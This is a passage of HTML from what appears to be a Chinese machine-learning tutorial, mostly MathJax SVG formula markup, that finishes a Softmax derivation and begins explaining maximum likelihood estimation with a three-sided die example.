667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(843.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1899.6,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(2677.6,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></svg></mjx-container></span> ，得到： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.27ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"11.912ex\" height=\"5.327ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1351.5 5264.9 2354.7\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1107.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(2163.5,0)\"><g data-mml-node=\"msup\" transform=\"translate(994.8,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-710)\"><g data-mml-node=\"munder\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,-285.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msup\" transform=\"translate(1549.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,289) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></g><rect width=\"2861.4\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span> 为了区分这里的 i\n，（一个是下标i，一个是求和变量），所以改写成： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.578ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"26.845ex\" height=\"5.636ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1351.5 11865.3 2491.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mtext\"><path data-c=\"53\" d=\"M55 507Q55 590 112 647T243 704H257Q342 704 405 641L426 672Q431 679 436 687T446 700L449 704Q450 704 453 704T459 705H463Q466 705 472 699V462L466 456H448Q437 456 435 459T430 479Q413 605 329 646Q292 662 254 662Q201 662 168 626T135 542Q135 508 152 480T200 435Q210 431 286 412T370 389Q427 367 463 314T500 191Q500 110 448 45T301 -21Q245 -21 201 -4T140 27L122 41Q118 36 107 21T87 -7T78 -21Q76 -22 68 -22H64Q61 -22 55 -16V101Q55 220 56 222Q58 227 76 227H89Q95 221 95 214Q95 182 105 151T139 90T205 42T305 24Q352 24 386 62T420 155Q420 198 398 233T340 281Q284 295 266 300Q261 301 239 306T206 314T174 325T141 343T112 367T85 402Q55 451 55 507Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(556,0)\"/><path data-c=\"66\" d=\"M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z\" transform=\"translate(1056,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(1362,0)\"/><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\" transform=\"translate(1751,0)\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(2584,0)\"/><path data-c=\"78\" d=\"M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z\" transform=\"translate(3084,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(3612,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(4001,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(4797,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5463.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(6519.5,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(7627.2,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(8683,0)\"><g data-mml-node=\"msup\" transform=\"translate(1035.2,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-710)\"><g data-mml-node=\"munder\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,-285.4) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g><g data-mml-node=\"msup\" transform=\"translate(1597,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,318.6) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g></g></g><rect width=\"2942.3\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span> 得到了 Softmax 的公式。</p>\n<h2 id=\"最大似然估计mle\">最大似然估计（MLE）</h2>\n<p>已知一些数据，这些数据可能满足某一个概率分布（例如高斯分布、或其他分布），这个概率分布的具体形状是由几个参数决定的（例如高斯分布是由方差和均值决定的）。</p>\n<p>最大似然估计就是用这些数据，<strong>估算</strong>出这个概率分布取什么参数具体值时，<strong>最贴合（最像、最似然）</strong>这些数据。</p>\n<p>即：<strong>找出使这些数据在该分布下出现概率最大的参数值。</strong></p>\n<p>那具体怎么计算呢？</p>\n<p>举一个例子：掷骰子（多面体分布 / 多项分布）</p>\n<p>你有一枚可能<strong>不公平的骰子</strong>，它有 3 个面（不是 6\n面），可能的结果是 1、2、3。</p>\n<p>你投掷 10 次，结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1, 1, 2, 3, 1, 2, 1, 3, 1, 2</span><br></pre></td></tr></table></figure>\n<p>换成频数：</p>\n<ul>\n<li>出现 1：5 次</li>\n<li>出现 2：3 次</li>\n<li>出现 3：2 次</li>\n</ul>\n<hr>\n<p><strong>步骤 1：建模</strong></p>\n<p>我们假设这枚骰子符合一个<strong>离散概率分布</strong>： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"57.89ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 25587.4 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(751,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(1140,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1640,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2306.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(3362.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 